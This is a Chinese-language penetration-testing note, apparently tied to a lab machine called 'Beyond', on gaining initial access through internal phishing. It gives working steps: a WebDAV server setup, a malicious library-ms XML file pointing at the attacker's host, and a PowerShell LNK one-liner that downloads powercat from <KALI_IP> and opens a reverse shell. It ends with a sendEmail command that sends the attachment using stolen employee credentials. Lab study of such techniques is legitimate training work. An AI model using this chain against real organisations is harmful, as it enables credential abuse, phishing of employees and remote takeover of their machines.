# 💥 釣魚郵件與惡意檔案初始存取 (phishing)

本文件說明如何利用受信任的內部郵件帳號寄送釣魚郵件，並配合 Windows Library-MS 檔案與惡意快捷方式 (LNK) 的組合，繞過安全防護以取得初始系統存取權。

---

## 🔍 漏洞成因與原理

在許多內部企業網路中，郵件伺服器 (如 hMailServer) 預設可能允許已驗證的 Domain 使用者向其他員工寄送信件。
此外，Windows 的 `Library-ms` 檔案是基於 XML 的定義檔，原本用來整合多個資料夾的檔案夾顯示。但如果將其中的儲存庫位置指向攻擊者控制的 WebDAV 伺服器，當使用者雙擊打開該 `library-ms` 檔案時，Windows Explorer 會自動連線並在視窗中顯示攻擊者託管的檔案（例如惡意快捷方式 `.lnk`），進而誘騙使用者點擊執行。

---

## 🛠️ 常見利用與繞過技巧

### 1. 設置 WebDAV 伺服器
在攻擊機上安裝並啟動 WebDAV 服務，將其目錄指向存有惡意快捷方式（如 `runme.lnk`）的資料夾，並允許匿名存取：
```bash
# 安裝與啟動 wsgidav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /path/to/webdav/folder
```

### 2. 建立惡意 `library-ms` 檔案
建立一個名為 `openme.library-ms` 的檔案，其 XML 內容如下，將連線的 URL 指向攻擊機的 WebDAV 服務：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@windows.storage.dll,-34582</name>
    <version>6</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1003</iconReference>
    <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <isSupported>false</isSupported>
            <simpleLocation>
                <url>http://<KALI_IP></url>
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
```

### 3. 準備惡意 LNK 快捷方式
在 WebDAV 目錄中放入一個快捷方式，其目標設定為執行惡意指令（如 PowerShell 執行 Reverse Shell）：
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI_IP>:<PORT>/powercat.ps1'); powercat -c <KALI_IP> -p <LISTENER_PORT> -e powershell"
```

### 4. 寄送釣魚郵件
使用已知員工憑證透過 `sendEmail` 命令連接內網 SMTP 伺服器發信，並夾帶該 `.library-ms` 檔案：
```bash
sendEmail -t <target_employees> -u "Subject" -s <smtp_server_ip> -a openme.library-ms -f <auth_username>@beyond.com -m "Message Body" -xu <auth_username>@beyond.com -xp '<password>'
```

---

# 實戰關聯
*   **靶機應用實例**：
    *   [[Beyond]]（利用從 Git 歷史還原出的 `john` 帳密，透過內網 Mailserver 發送掛載 WebDAV 的 `openme.library-ms` 檔案，引誘使用者執行惡意 `runme.lnk`，取得 `CLIENTWK1` 主機的 `beyond\marcus` 權限 Shell）。
